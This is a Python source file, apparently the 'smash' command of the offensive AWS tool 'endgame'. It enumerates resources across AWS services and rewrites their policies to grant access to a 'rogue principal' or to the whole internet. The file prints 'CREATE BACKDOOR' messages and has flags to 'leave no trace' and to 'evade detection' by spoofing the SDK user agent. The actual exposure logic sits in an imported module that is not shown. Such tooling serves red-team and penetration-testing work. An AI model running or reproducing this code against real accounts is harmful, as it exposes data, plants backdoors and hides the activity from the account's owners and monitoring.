"""
Smash your AWS Account to pieces by exposing massive amounts of resources to a rogue principal or to the internet
"""
import sys
import logging
import click
import boto3
from policy_sentry.util.arns import (
    parse_arn_for_resource_type,
    get_resource_path_from_arn,
)
from colorama import Fore, Back, Style
from endgame import set_log_level
from endgame.shared.aws_login import get_boto3_client, get_current_account_id
from endgame.shared.validate import click_validate_supported_aws_service, click_validate_user_or_principal_arn
from endgame.shared import utils, constants
from endgame.command.list_resources import get_all_resources_for_all_services, list_resources_by_service
from endgame.command.expose import expose_service
from endgame.shared.response_message import ResponseMessage

logger = logging.getLogger(__name__)
END = "\033[0m"


@click.command(name="smash", short_help="Smash your AWS Account to pieces by exposing massive amounts of resources to a"
                                        " rogue principal or to the internet")
@click.option(
    "--service",
    "-s",
    type=str,
    required=True,
    help=f"The AWS service in question. Valid arguments: {', '.join(constants.SUPPORTED_AWS_SERVICES)}",
    callback=click_validate_supported_aws_service,
)
@click.option(
    "--evil-principal",
    "-e",
    type=str,
    required=True,
    help="Specify the name of your resource",
    callback=click_validate_user_or_principal_arn,
    envvar="EVIL_PRINCIPAL"
)
@click.option(
    "--profile",
    "--p",
    type=str,
    required=False,
    help="Specify the AWS IAM profile.",
    envvar="AWS_PROFILE"
)
@click.option(
    "--region",
    "-r",
    type=str,
    required=False,
    default="us-east-1",
    help="The AWS region",
    envvar="AWS_REGION"
)
@click.option(
    "--dry-run",
    "-d",
    is_flag=True,
    default=False,
    help="Dry run, no modifications",
)
@click.option(
    "--undo",
    "-u",
    is_flag=True,
    default=False,
    help="Undo the previous modifications and leave no trace",
)
@click.option(
    "--cloak",
    "-c",
    is_flag=True,
    default=False,
    help="Evade detection by using the default AWS SDK user agent instead of one that indicates usage of this tool.",
)
@click.option(
    "-v",
    "--verbose",
    "verbosity",
    count=True,
)
def smash(service, evil_principal, profile, region, dry_run, undo, cloak, verbosity):
    """
    Smash your AWS Account to pieces by exposing massive amounts of resources to a rogue principal or to the internet
    """
    set_log_level(verbosity)
    # Get the current account ID
    sts_client = get_boto3_client(profile=profile, service="sts", region=region, cloak=cloak)
    current_account_id = get_current_account_id(sts_client=sts_client)
    if evil_principal.strip('"').strip("'") == "*":
        principal_type = "internet-wide access"
        principal_name = "*"
    else:
        principal_type = parse_arn_for_resource_type(evil_principal)
        principal_name = get_resource_path_from_arn(evil_principal)
    results = []
    if service == "all":
        # TODO: Big scary warning message and confirmation
        results = get_all_resources_for_all_services(profile=profile, region=region,
                                                     current_account_id=current_account_id, cloak=cloak)
    else:
        client = get_boto3_client(profile=profile, service=service, region=region, cloak=cloak)
        result = list_resources_by_service(provided_service=service, region=region,
                                           current_account_id=current_account_id, client=client)
        results.extend(result.resources)

    if undo and not dry_run:
        utils.print_green("UNDO BACKDOOR:")
    elif dry_run and not undo:
        utils.print_red("CREATE BACKDOOR (DRY RUN):")
    elif dry_run and undo:
        utils.print_green("UNDO BACKDOOR (DRY RUN):")
    else:
        utils.print_red("CREATE_BACKDOOR:")

    for resource in results:
        name = resource.name
        region = resource.region
        translated_service = utils.get_service_translation(provided_service=resource.service)
        client = None
        client = get_boto3_client(profile=profile, service=translated_service, region=region, cloak=cloak)
        response_message = smash_resource(service=translated_service, region=region, name=name,
                                          current_account_id=current_account_id,
                                          client=client, undo=undo, dry_run=dry_run, evil_principal=evil_principal)
        # TODO: If it fails, show the error message that it wasn't successful.
        if undo and not dry_run:
            print_remove(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
        elif undo and dry_run:
            print_remove(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
        elif not undo and dry_run:
            print_add(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
        else:
            print_add(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)


def print_remove(service: str, resource_type: str, resource_name: str, principal_type: str, principal_name: str, success: bool):
    resource_message_string = f"{service.upper()} {resource_type.capitalize()} {resource_name}:"
    remove_string = f"Remove {principal_type} {principal_name}"
    width = [15, 10]
    if success:
        success_string = f"{Back.GREEN}SUCCESS{END}"
    else:
        success_string = f"{Fore.RED}FAILED{END}"
    # success_string = str(success)
    message = f"{resource_message_string:<}: {remove_string}"
    utils.print_blue(f"{message:<100}{success_string:>20}")


def print_add(service: str, resource_type: str, resource_name: str, principal_type: str, principal_name: str, success: bool):
    resource_message_string = f"{service.upper()} {resource_type.capitalize()} {resource_name}"
    add_string = f"Add {principal_type} {principal_name}"
    if success:
        success_string = f"{Fore.GREEN}SUCCESS{END}"
    else:
        success_string = f"{Fore.RED}FAILED{END}"
    message = f"{resource_message_string:<}: {add_string}"
    utils.print_blue(f"{message:<100}{success_string:>20}")


def stdout(message):
    # sys.stdout.write(message)
    # sys.stdout.write('\b' * len(message))   # \b: non-deleting backspace
    print(message)
    print('\b' * len(message))   # \b: non-deleting backspace


def demo():
    stdout('Right'.rjust(50))
    stdout('Left')
    sys.stdout.flush()
    print()

def smash_resource(
        service: str,
        region: str,
        name: str,
        current_account_id: str,
        client: boto3.Session.client,
        undo: bool,
        dry_run: bool,
        evil_principal: str,
) -> ResponseMessage:
    service = utils.get_service_translation(provided_service=service)
    response_message = expose_service(provided_service=service, region=region, name=name,
                                      current_account_id=current_account_id,
                                      client=client, undo=undo, dry_run=dry_run, evil_principal=evil_principal)
    return response_message
